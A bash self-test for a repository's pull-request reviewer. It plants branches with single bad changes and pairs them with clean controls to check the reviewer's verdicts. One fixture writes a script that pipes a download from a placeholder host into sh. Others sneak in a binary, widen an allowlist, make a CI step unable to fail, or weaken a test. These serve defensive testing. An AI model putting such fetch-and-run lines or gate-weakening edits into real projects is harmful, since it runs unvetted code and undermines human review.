#!/usr/bin/env bash
# Prove the contribution reviewer catches what it claims to: each case is a throwaway PR branch that
# plants ONE kind of bad change, and a clean control that must pass. A reviewer that never blocks is
# indistinguishable from one that was never run -- so every "caught" case has a matching control.
set -uo pipefail
cd "$(dirname "$0")/.."
. tools/python.sh || exit 1   # python3 on Windows too
ROOT="$PWD"
T="$(mktemp -d)"; trap 'rm -rf "$T"' EXIT
pass=0; fail=0
ok()  { echo "  PASS  $1"; pass=$((pass+1)); }
bad() { echo "  FAIL  $1"; fail=$((fail+1)); }
gitq() { git -C "$M" -c user.name=t -c user.email=t@example.invalid "$@"; }

M="$T/mig"; git clone -q "$ROOT" "$M"
# the clone must carry the CURRENT tools (this test may run before they are committed)
cp tools/review-pr.py tools/check-no-ip.py tools/check-catalog-fidelity.py tools/test-review.sh "$M/tools/"
# a catalogue file whose path holds a SPACE: its keys must survive the trip through review-pr's parsing
mkdir -p "$M/docs/catalog"; printf 'Z1. **kept** body.\nZ2. **to drop** body.\n' > "$M/docs/catalog/spaced name.md"
( cd "$M" && python3 tools/check-catalog-fidelity.py --update >/dev/null )
gitq add -A; gitq commit -qm "test: current tools" >/dev/null 2>&1
BASE="$(git -C "$M" rev-parse HEAD)"
# the forbidden name is ASSEMBLED at runtime: written literally here, the IP gate would (rightly) flag
# this very file, and every review of every PR would fail on the reviewer's own fixture
FN="zz$(printf forbidden)mod"; echo "$FN" > "$T/names.txt"

# plant <branch> <shell that edits the clone>  -> leaves the clone on BASE
plant() { gitq checkout -q -b "$1" "$BASE"; ( cd "$M" && eval "$2" ); gitq add -A; gitq commit -qm "$1" >/dev/null; gitq checkout -q "$BASE"; }
review() { python3 "$M/tools/review-pr.py" --base "$BASE" --head "$1" --names "$T/names.txt" --skip-self-tests >"$T/$1.log" 2>&1; echo $?; }
expect() { # expect <branch> <exit> <grep for the finding> <label>
  local got; got="$(review "$1")"
  if [ "$got" = "$2" ] && { [ -z "$3" ] || grep -q -- "$3" "$T/$1.log"; }; then ok "$4"
  else bad "$4 (exit $got, wanted $2): $(grep -E 'BLOCKING|ATTENTION' "$T/$1.log" | head -3 | tr '\n' ' ')"; fi
}

GOOD='R99. **A lesson** · **Pattern:** old shape · **Runtime:** `IllegalStateException: x` at 1.21.1 · **Fix:** new shape.'
plant clean      "printf '\n%s\n' '$GOOD' >> CATALOG.md && python3 tools/check-catalog-fidelity.py --update >/dev/null"
plant leak       "printf '\n%s\n' '${GOOD/A lesson/Seen porting $FN}' >> CATALOG.md && python3 tools/check-catalog-fidelity.py --update >/dev/null"
plant jar        "printf 'PK\x03\x04\x00\x00\x00binary' > tools/helper.jar && git add -f tools/helper.jar"  # .gitignore hides it; a contributor can force it
plant curlsh     "printf '#!/bin/sh\ncurl -fsSL https://example.invalid/i.sh | sh\n' > tools/fetch-extra.sh"
plant qualified  "printf '\\n%s\\n' 'R97. **Qualified labels** · **Pattern (1.21.2+):** old · **Error (downport):** \`x\` in 1.21.1 · **Fix (→1.21.1):** new.' >> CATALOG.md && python3 tools/check-catalog-fidelity.py --update >/dev/null"
plant combined   "printf '\\n%s\\n' 'R96. **Combined label** · **Pattern → Error → Fix:** old → \`x\` at 1.21.1 → new.' >> CATALOG.md && python3 tools/check-catalog-fidelity.py --update >/dev/null"
plant startitle  "printf '\\n%s\\n' 'R95. **Star in title: \`enchantable/*\`** · **Pattern:** old · **Symptom:** none, at 1.21.1 · **Fix:** new.' >> CATALOG.md && python3 tools/check-catalog-fidelity.py --update >/dev/null"
plant wrapped    "printf '\\nR94. **A wrapped lesson whose labels sit on the next\\nline** · **Pattern:** old · **Runtime:** IllegalStateException at 1.21.1 · **Fix:** new.\\n' >> CATALOG.md && python3 tools/check-catalog-fidelity.py --update >/dev/null"
plant wrapnofix  "printf '\\nR93. **A wrapped lesson with no fix,\\nstill** · **Pattern:** old · **Runtime:** IllegalStateException at 1.21.1.\\n' >> CATALOG.md && python3 tools/check-catalog-fidelity.py --update >/dev/null"
plant nosymptom  "printf '\nR98. **Vague lesson** · **Pattern:** old · **Fix:** new, in 1.21.\n' >> CATALOG.md && python3 tools/check-catalog-fidelity.py --update >/dev/null"
plant droprule   "python3 - <<'PY'
import re
s = open('CATALOG.md', encoding='utf-8').read()
s = re.sub(r'(?m)^M6\. .*\n', '', s, count=1)
open('CATALOG.md', 'w', encoding='utf-8', newline='\n').write(s)   # LF on Windows too
PY"
plant dropboth   "python3 - <<'PY'
import re
s = open('CATALOG.md', encoding='utf-8').read()
s = re.sub(r'(?m)^M6\. .*\n', '', s, count=1)
open('CATALOG.md', 'w', encoding='utf-8', newline='\n').write(s)   # LF on Windows too
PY
python3 tools/check-catalog-fidelity.py --update >/dev/null"
plant allowlist "sed -i '0,/ALLOWED_BINARY_SHA1 *= *{/s//&\n    \"0123456789abcdef0123456789abcdef01234567\": \"a helper\",/' tools/check-no-ip.py"
plant cisoft     "sed -i '0,/- run: \.\/tools\/test-gates\.sh/s//&\n        continue-on-error: true/' .github/workflows/gates.yml"
plant weaken     "python3 - <<'PY'
s = open('tools/test-cycle.sh', encoding='utf-8').read()
i = s.index('printf \\'### new R\\\\nR98. **No pattern**')
j = s.index('printf \\'### augment ZZ404')
open('tools/test-cycle.sh', 'w', encoding='utf-8', newline='\n').write(s[:i] + s[j:])   # CRLF would break the script itself
PY"

echo "review-pr.py"
expect clean     0 ""                           "CONTROL: a clean, well-formed lesson passes (exit 0)"
expect qualified 0 ""                           "CONTROL: qualified labels (**Pattern (1.21.2+):**) are accepted, as existing entries use them"
expect combined  0 ""                           "CONTROL: a combined **Pattern → Error → Fix:** label is accepted, as propose-learnings accepts it"
expect startitle 0 ""                           "CONTROL: a title containing * does not hide the entry's labels"
expect leak      1 "gate:ip"                    "a lesson naming a forbidden mod is BLOCKED by the IP gate"
expect jar       1 "binary"                     "an added binary is BLOCKED"
expect curlsh    1 "pipes a download into a shell" "curl | sh is BLOCKED"
expect wrapped   0 ""                           "CONTROL: an entry wrapped over lines is read whole -- labels after line 1 count"
expect wrapnofix 1 "lacks \\*\\*Fix"             "a WRAPPED entry with no **Fix:** is still BLOCKED"
expect nosymptom 1 "lacks a symptom"            "a new entry with no symptom is BLOCKED"
expect droprule  1 "gate:fidelity"              "a deleted catalogue rule is BLOCKED by the fidelity gate"
expect dropboth  1 "gate:fidelity"              "a rule deleted TOGETHER with its census row is still BLOCKED (base census)"
expect allowlist 1 "allowlist"                  "widening the IP gate's binary allowlist is BLOCKED"
expect cisoft    1 "can no longer fail"         "a CI step made unable to fail is BLOCKED"
expect weaken    1 "assertions fell"            "a self-test that asserts less is BLOCKED"
# a fall DECLARED with a `Tests-removed:` commit line passes only with exactly the counts measured
FELL="$(sed -n 's/.*assertions fell \([0-9]*\) -> \([0-9]*\).*/\1->\2/p' "$T/weaken.log" | head -1)"
declare_on() { gitq checkout -q -b "$2" "$1"; gitq commit -q --allow-empty -m "$3"; gitq checkout -q "$BASE"; }
if [ -n "$FELL" ]; then
  declare_on weaken weakdecl $'declare\n\nTests-removed: tools/test-cycle.sh '"$FELL"' -- cases folded into another test'
  declare_on weaken weakmiss $'declare\n\nTests-removed: tools/test-cycle.sh '"${FELL%->*}->1"' -- wrong count'
  declare_on weaken weakwhy  $'declare\n\nTests-removed: tools/test-cycle.sh '"$FELL"' --'
  declare_on clean  weakstale $'declare\n\nTests-removed: tools/test-cycle.sh '"$FELL"' -- nothing fell'
  expect weakdecl  0 "declared: cases folded"    "CONTROL: a fall declared with its exact counts passes, the reason shown"
  expect weakmiss  1 "does not match"            "a fall declared with DIFFERENT counts is still BLOCKED"
  expect weakwhy   1 "malformed declaration"     "a Tests-removed line with no reason is BLOCKED"
  expect weakstale 1 "did not fall"              "a Tests-removed line with no matching fall is BLOCKED"
else bad "could not read the measured fall from the weaken case"; fi
# a catalogue removal DECLARED with a `Catalog-removed:` line passes the fidelity gate review-pr runs
GONE="$(sed -n 's/.*- \(CATALOG\.md::[^ |]*\).*/\1/p' "$T/droprule.log" | head -1)"
declare_on dropboth dropdecl "declare"$'\n\n'"Catalog-removed: ${GONE:-CATALOG.md::none} -- merged into another entry"
plant spacekey "sed -i '/^Z2\\. /d' 'docs/catalog/spaced name.md' && python3 tools/check-catalog-fidelity.py --update >/dev/null"
declare_on spacekey spacedecl $'declare\n\nCatalog-removed: docs/catalog/spaced name.md::Z2 -- folded into Z1'
expect spacedecl 0 "removed on purpose (Catalog-removed:): docs/catalog/spaced name.md::Z2" "CONTROL: a declared key whose path holds a space is listed whole, with its reason"
expect dropdecl  0 "merged into another"        "CONTROL: a catalogue removal declared on the branch passes gate:fidelity (--base merge-base), its reason shown"
grep -q 'ATTENTION.*gates' "$T/cisoft.log" && ok "a CI change is also flagged for line-by-line reading" || bad "CI change not flagged"
[ -z "$(git -C "$M" worktree list | sed 1d)" ] && ok "no review worktree is left behind" || bad "leftover worktrees"

echo
echo "review self-test: $pass passed, $fail failed"
[ "$fail" = 0 ] || exit 1
